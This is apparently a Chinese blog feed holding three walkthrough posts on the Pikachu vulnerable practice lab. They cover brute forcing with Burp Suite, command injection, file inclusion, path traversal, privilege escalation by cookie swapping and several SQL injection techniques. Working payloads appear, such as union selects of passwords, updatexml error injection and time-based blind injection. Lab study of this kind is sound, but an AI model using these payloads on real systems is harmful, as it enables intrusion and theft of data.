</p><p>如果一定要通过后台服务器远程去对用户指定(“或者预埋在前端的请求”)的地址进行资源请求,则请做好目标地址的过滤。</p><p>你可以根据”SSRF”里面的项目来搞懂问题的原因 </p><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>后面PHP反序列化和XXE还有SSRF还不是很理解，找个时间去做一次复现。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在pikachu靶场练习一下，复习一下漏洞。&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透" scheme="/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透" scheme="/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>靶场练习-3</title>
    <link href="/2019/03/10/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-3/"/>
    <id>/2019/03/10/靶场练习-3/</id>
    <published>2019-03-09T16:00:00.000Z</published>
    <updated>2019-03-09T10:15:37.325Z</updated>
    
    <content type="html"><![CDATA[<p>在pikachu靶场练习一下，复习一下漏洞。</p><a id="more"></a><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>概述：<br>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。 </p><pre><code>远程系统命令执行一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器</code></pre><p>现在很多的甲方企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。 在这种平台上往往会出现远程系统命令执行的漏洞,不信的话现在就可以找你们运维部的系统测试一下,会有意想不到的”收获”-_- </p><pre><code>远程代码执行同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。 因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。 你可以通过“RCE”对应的测试栏目，来进一步的了解该漏洞。 </code></pre><h3 id="exec-“ping”"><a href="#exec-“ping”" class="headerlink" title="exec “ping”"></a>exec “ping”</h3><p>这里是在前端可以执行一个ping的操作。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/49.png" class="lazyload"></p><p>我们可以拼接一个查看系统ip的操作。</p><pre><code class="javascript"><span class="number">192.168</span><span class="number">.61</span><span class="number">.125</span> &amp; ipconfig</code></pre><p><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/50.png" class="lazyload"></p><h3 id="exec-“eval”"><a href="#exec-“eval”" class="headerlink" title="exec “eval”"></a>exec “eval”</h3><p>远程代码执行漏洞。对于前端输入的文本进行eval输出。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/16.gif" class="lazyload"><br>看一下代码。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/51.png" class="lazyload"><br>对前端输入的txt进行eval输出。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/17.gif" class="lazyload"></p><h2 id="File-Inclusion-文件包含漏洞"><a href="#File-Inclusion-文件包含漏洞" class="headerlink" title="File Inclusion(文件包含漏洞)"></a>File Inclusion(文件包含漏洞)</h2><pre><code>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了：include(),include_once()require(),require_once()这些文件包含函数，这些函数在代码设计中被经常使用到。大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：1.本地文件包含漏洞：仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。2.远程文件包含漏洞：能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。 因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。 你可以通过“File Inclusion”对应的测试栏目，来进一步的了解该漏洞。 </code></pre><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/18.gif" class="lazyload"><br>看到在列表里面选择某个选项以后提交就会显示响应的界面，我们在url里面发现，界面是通过读取本地的php文件显示的。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/52.png" class="lazyload"><br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/53.png" class="lazyload"><br>在url的传参内修改成系统的文件就可以读取。</p><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>前置条件：<br>allow_url_fopen = on //默认打开<br>allow_url_include = on //默认关闭</p><p>利用方式：<br>搭建恶意站点，包含文件执行。</p><h2 id="unsafe-filedownload"><a href="#unsafe-filedownload" class="headerlink" title="unsafe filedownload"></a>unsafe filedownload</h2><p>不安全的文件下载概述<br>    文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。<br>    此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。<br>    所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。 切记：所有与前端交互的数据都是不安全的，不能掉以轻心！<br>    你可以通过“Unsafe file download”对应的测试栏目，来进一步的了解该漏洞。 </p><p>文件下载：<br>可以对传参修改下载敏感文件</p><h2 id="unsafe-upfileupload"><a href="#unsafe-upfileupload" class="headerlink" title="unsafe upfileupload"></a>unsafe upfileupload</h2><p>不安全的文件上传漏洞概述<br>    文件上传功能在web应用系统很常见，比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，后台会对上传的文件进行判断 比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。 如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被webshell。<br>    所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑。比如：<br>    –验证文件类型、后缀名、大小;<br>    –验证文件的上传方式;<br>    –对文件进行一定复杂的重命名;<br>    –不要暴露文件上传后的路径;<br>    –等等…<br>    你可以通过“Unsafe file upload”对应的测试栏目，来进一步的了解该漏洞。 </p><p>文件上传：<br>上传一句话木马。有很多种绕过方式。其他的博客讲的比这里好，这里只是粗略的讲了几个绕过方式。<br><a href="https://www.cnblogs.com/ldhbetter/p/9190556.html">https://www.cnblogs.com/ldhbetter/p/9190556.html</a></p><h2 id="over-permission"><a href="#over-permission" class="headerlink" title="over permission"></a>over permission</h2><pre><code>如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。 越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。 一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对 对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。 因此，在在权限管理中应该遵守：1.使用最小权限原则对用户进行赋权;2.使用合理（严格）的权限校验规则;3.使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件;你可以通过“Over permission”对应的测试栏目，来进一步的了解该漏洞。 </code></pre><h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><p>平行越权：同级别权限操作。<br>这里我这直接一个动图演示全部。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/19.gif" class="lazyload"><br>这里是登录以后有查看个人资料的权限，通过修改url传参以后，可以查看同等级用户的资料。</p><h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>垂直越权：低级别对高级别操作。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20.gif" class="lazyload"><br>这是一个普通管理员用户，只有查看信息的权限。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/21.gif" class="lazyload"><br>这是超级管理员用户，有添加用户权限。</p><p><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/54.png" class="lazyload"><br>查看数据包，这是超级管理员添加用户时发送的数据包。<br>cookie是：qvat0froo8gp1go7kfoegcnse4</p><p><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/22.gif" class="lazyload"><br>这里我们登陆了普通用户以后，用普通用户的cookie替换到超级管理员添加用户时的数据包，发现也能添加用户。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/55.png" class="lazyload"></p><p>这就是垂直越权漏洞。</p><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p>目录遍历漏洞概述<br>    在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。 从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。<br>    看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的 方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下。<br>    需要区分一下的是,如果你通过不带参数的url（比如：<a href="http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，我们成为敏感信息泄露。">http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，我们成为敏感信息泄露。</a> 而并不归为目录遍历漏洞。（关于敏感信息泄露你你可以在”i can see you ABC”中了解更多）<br>    你可以通过“../../”对应的测试栏目，来进一步的了解该漏洞。 </p><h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><p>敏感信息泄露概述<br>    由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。 比如：<br>    —通过访问url下的目录，可以直接列出目录下的文件列表;<br>    —输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;<br>    —前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;<br>    类似以上这些情况，我们成为敏感信息泄露。敏感信息泄露虽然一直被评为危害比较低的漏洞，但这些敏感信息往往给攻击着实施进一步的攻击提供很大的帮助,甚至“离谱”的敏感信息泄露也会直接造成严重的损失。 因此,在web应用的开发上，除了要进行安全的代码编写，也需要注意对敏感信息的合理处理。<br>    你可以通过“i can see your abc”对应的测试栏目，来进一步的了解该漏洞。 </p><h1 id="——未完待续——"><a href="#——未完待续——" class="headerlink" title="——未完待续——"></a>——未完待续——</h1>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在pikachu靶场练习一下，复习一下漏洞。&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透" scheme="/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透" scheme="/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>靶场练习-2</title>
    <link href="/2019/03/09/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-2/"/>
    <id>/2019/03/09/靶场练习-2/</id>
    <published>2019-03-08T16:00:00.000Z</published>
    <updated>2019-04-27T07:54:11.831Z</updated>
    
    <content type="html"><![CDATA[<p>在pikachu靶场练习一下，复习一下漏洞。</p><a id="more"></a><h2 id="Sql-Inject"><a href="#Sql-Inject" class="headerlink" title="Sql Inject"></a>Sql Inject</h2><p>在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。<br>一个严重的SQL注入漏洞，可能会直接导致一家公司破产！<br>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。<br>在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：<br>1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；<br>2.使用参数化（Parameterized Query 或 Parameterized Statement）；<br>3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需要慎重! </p><h3 id="数字型注入（post）"><a href="#数字型注入（post）" class="headerlink" title="数字型注入（post）"></a>数字型注入（post）</h3><p>看一下界面使用效果。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/3.gif" class="lazyload"><br>看到选中某些数字的时候，进行查询，显示对应的信息。<br>初步判断是通过数字判断，对应取出数据库的内容显示出来。<br>可以修改传入的参数，达到我们想要的查询。<br>可以尝试 or 1=1，看能否达到一个数据遍历的效果。<br>理解一下or 1=1在数据库中实现的效果。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/30.png" class="lazyload"><br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/31.png" class="lazyload"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select username,email from member where id=1;  ##这一句是查询表中 username，email字段通过id=1来进行查找</span><br><span class="line">select username,email from member where id=1 or 1=1;  ##当后面加入一句or 1=1的时候，该句的意思就是select username,email from member。    id=1 or 1=1变成一个or判断  1真且为真，1=1为真，整句就为真，就只执行前面的select username,email from member</span><br></pre></td></tr></table></figure><p>然后尝试在web端进行传参的修改。</p><p><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/4.gif" class="lazyload"></p><p>这样就达到了一个数据遍历的效果</p><h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>看一下界面使用效果。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/5.gif" class="lazyload"><br>这里是输入对应的字符以后会显示出相应的内容。</p><p>看一下数据库中根据字符串的查询语句。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/32.png" class="lazyload"><br>字符串的查询需要添加’’两个单引号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,email FROM member where username=&apos;kobe&apos;;</span><br></pre></td></tr></table></figure><p>如果想要构造一个数据遍历的查询语句，应该是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,email FROM member where username=&apos;kobe&apos; or 1=1;</span><br></pre></td></tr></table></figure><p><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/33.png" class="lazyload"></p><p>看一下php中对于字符的传参是如何进行的，<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/34.png" class="lazyload"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$name=$_GET[&apos;name&apos;];</span><br><span class="line">    //这里的变量是字符型，需要考虑闭合</span><br><span class="line">    $query=&quot;select id,email from member where username=&apos;$name&apos;&quot;;</span><br></pre></td></tr></table></figure><p>这里是将输入的name的内容直接带进查询语句查询，内容在’’内，所以我们需要构造一个单引号’的闭合，所以我们键入的内容可以是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe&apos; or 1=1#</span><br></pre></td></tr></table></figure><p>#用于对后面的单引号’注释。</p><p>这样键入的内容是kobe’ or 1=1#，带入查询后的操作语句就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query=&quot;select id,email from member where username=&apos;kobe&apos; or 1=1#&apos;&quot;;</span><br></pre></td></tr></table></figure><p>看一下效果<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/6.gif" class="lazyload"></p><h3 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h3><p>看一下界面使用效果。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/7.gif" class="lazyload"></p><p>这应该是数据库中的模糊查询。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/35.png" class="lazyload"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * FROM member where username like &apos;%k%&apos;;</span><br></pre></td></tr></table></figure><p>那我们同样是构造闭合再带入数据库操作语句去进行执行就可以了。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/36.png" class="lazyload"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * FROM member where username like &apos;%k%&apos; or 1=1#%&apos;;</span><br></pre></td></tr></table></figure><p>看一下在web端的操作效果<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/8.gif" class="lazyload"></p><h3 id="union联合查询"><a href="#union联合查询" class="headerlink" title="union联合查询"></a>union联合查询</h3><p>联合查询的字段数需要和住查询一致。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/37.png" class="lazyload"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,email FROM member where username=&apos;kobe&apos; union select username,pw from member where id=1</span><br></pre></td></tr></table></figure><p>在字符型注入中拼接上联合查询，可以查询其他字典内容。</p><p>将</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe&apos; union select username,pw from member where id=1#</span><br></pre></td></tr></table></figure><p>在web端键入。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/9.gif" class="lazyload"><br>可以查出id=1的username和pw</p><p>利用联合注入还可以做很多事，例如查询其他表的内容。<br>例如查询user表的账号密码。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/39.png" class="lazyload"><br>给张图看一下其他的查询<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/38.png" class="lazyload"></p><p>可以使用order by排序判断字段数<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/40.png" class="lazyload"><br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/41.png" class="lazyload"><br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/10.gif" class="lazyload"></p><h3 id="基于函数的报错注入"><a href="#基于函数的报错注入" class="headerlink" title="基于函数的报错注入"></a>基于函数的报错注入</h3><p>这里其实我不是很理解，可能是因为以前学数据库的时候没用过这些函数吧。<br>不过看了视频做了点笔记，后面在好好琢磨一下。<br>技巧思路：<br>    在mysql中使用一些指定函数来制造报错，从而从报错信息中获取设定的信息。select/inset/update/delete都可以使用报错来获取信息。<br>背景条件：<br>    后台没有屏蔽数据库报错信息，在语法发生错误时会输出在前端。</p><p>附上一张报错注入的图：<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/42.png" class="lazyload"></p><h3 id="insert-update注入"><a href="#insert-update注入" class="headerlink" title="insert/update注入"></a>insert/update注入</h3><p>这里也是利用函数报错注入，还没弄得太懂，后面再做了。<br>包括后面有个的一个delete注入，是抓包以后再包内进行函数报错注入。</p><h3 id="http头注入"><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h3><p>对HTTP heade传过来的参数为进行过滤直接拼接进语句。<br>同样是利用函数参数报错注入。看一下界面。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/43.png" class="lazyload"></p><p>然后在HTTP heade传参部分构造一个函数注入报错。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/44.png" class="lazyload"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and updatexml(1,concat(0x7e,database()),0)#</span><br></pre></td></tr></table></figure><p>将此代码拼接到cookie处。</p><h3 id="基于boolian的盲注"><a href="#基于boolian的盲注" class="headerlink" title="基于boolian的盲注"></a>基于boolian的盲注</h3><p>基于boolian的盲注的主要表现症状：<br>0，没有报错信息<br>1，不管正确的输入，还是错误的输入，都只显示两种情况（0或1）<br>2，在正确的输入下，输入and 1=1 /and 1=2即可判断</p><p>通过真假的回显对比ASCII码来获取数据内容。</p><p>看下操作过程：<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/11.gif" class="lazyload"></p><p>​<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/45.png" class="lazyload"><br>此语句可以查询数据库第一个字符。</p><p>将字符转换成ascii码<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/46.png" class="lazyload"></p><p>接下来可以通过对比ascii码的大小做判断，<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/47.png" class="lazyload"><br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/48.png" class="lazyload"><br>大于100为真，大于113为假。</p><p>通过这个我们就可以在web端进行boolian注入。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/12.gif" class="lazyload"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and ascii(substr(database(),1,1))&gt;113#</span><br></pre></td></tr></table></figure><p>当然，我们可以先通过其他语句判断数据库名字长度。</p><p>​    </p><h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><p>这种用于没有回显的情况下的注入，利用时间判断，如果数据等于猜测的值，则执行sleep（5）<br>看一下界面。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/13.gif" class="lazyload"><br>不管我们尝试什么语句都只有一种回显。</p><p><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/14.gif" class="lazyload"><br>但是我们发现它可以执行sleep（5）语句。</p><p>我们利用这个语句来进行基于时间的盲注。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe&apos; and if((substr(database(),1,1))=&apos;p&apos;,sleep(5),null)#</span><br></pre></td></tr></table></figure><p><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/15.gif" class="lazyload"></p><p>当第一个字符等于’a’时，不执行sleep（5），当第一个字符等于’p’时，执行sleep（5）。</p><h3 id="sql注入-OS远程控制"><a href="#sql注入-OS远程控制" class="headerlink" title="sql注入-OS远程控制"></a>sql注入-OS远程控制</h3><p>通过sql注入写入恶意代码<br>前提条件：<br>    1，需要知道远程目录<br>    2，需要远程目录有写权限<br>    3，需要数据库开启了secure_file_priv</p><h1 id="——未完待续——"><a href="#——未完待续——" class="headerlink" title="——未完待续——"></a>——未完待续——</h1>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在pikachu靶场练习一下，复习一下漏洞。&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透" scheme="/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透" scheme="/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>靶场练习-1</title>
    <link href="/2019/03/08/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-1/"/>
    <id>/2019/03/08/靶场练习-1/</id>
    <published>2019-03-07T16:00:00.000Z</published>
    <updated>2019-11-11T07:29:03.802Z</updated>
    
    <content type="html"><![CDATA[<p>在pikachu靶场练习一下，复习一下漏洞。</p><a id="more"></a><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>Burte Force（暴力破解）概述<br>    “暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。<br>    理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：<br>    1.是否要求用户设置复杂的密码；<br>    2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；<br>    3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；<br>    4.是否采用了双因素认证；<br>    …等等。</p><h3 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h3><p>看一下界面<br> <img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/1.png" class="lazyload"></p><p> 输入账号密码，打开burp suite抓包。</p><p> <img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/2.png" class="lazyload"></p><p>  输入的账号密码在这里。</p><p>  发送。<br>  <img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/3.png" class="lazyload"></p><p>选中第三个选项，然后把他选中的变量都清除掉，自己将账号密码变量add到爆破的内容中。</p><p>  <img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/4.png" class="lazyload"></p><p>点击payload，一个个给变量选着爆破字典，给账号密码选中爆破的字典。我这里是手动写了几个字典进去。</p><p><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/5.png" class="lazyload"><br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/6.png" class="lazyload"><br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/7.png" class="lazyload"></p><p>爆破。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/8.png" class="lazyload"></p><p>然后我们可以看到爆破后结果的长度有所不同。看一下回显。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/9.png" class="lazyload"></p><p>长度为35076的是账号密码错误的。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/10.png" class="lazyload"></p><p>长度为35052的是账号密码正确的。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/11.png" class="lazyload"></p><h3 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h3><p>验证是在客户端进行的都是客户可控的，都是不安全的。</p><p> 看一下页面。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/12.png" class="lazyload"><br>查看一下页面源代码，看见验证是在前端通过一个JavaScript代码进行验证码的生成和验证的。<br><img alt data-src="/images/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/13.png" class="lazyload"><br>抓一下包，发送到重放模块。<br><img alt 